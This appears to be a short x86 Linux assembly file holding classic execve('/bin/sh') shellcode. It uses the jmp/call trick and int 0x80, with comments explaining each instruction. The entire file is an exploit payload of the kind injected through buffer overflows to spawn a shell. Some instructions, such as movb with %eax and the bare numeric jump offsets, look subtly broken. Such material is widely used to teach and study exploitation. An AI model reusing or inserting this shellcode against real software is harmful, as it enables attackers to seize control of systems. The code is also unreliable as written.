.globl code_start
.globl code_end
	.data
code_start:
	jmp 27
	popl %esi
	movl %esi,0x8(%esi)	/* put address of **argv behind shellcode,
				   0x8 bytes behind it so a /bin/sh has place */
	xorl %eax,%eax		/* put 0 in %eax */
	movb %eax,0x7(%esi)	/* put terminating 0 after /bin/sh string */
	movl %eax,0xc(%esi)	/* another 0 to get the size of a long word */
	movb $0xb,%al		/* execve(         */
	movl %esi,%ebx		/* "/bin/sh",      */
	leal 0x8(%esi),%ecx	/* & of "/bin/sh", */
	xorl %edx,%edx		/* NULL		   */
	int $0x80		/* );		   */
	call -24
	.string "/bin/shX"	/* X is overwritten by movb %eax,0x7(%esi) */
code_end:

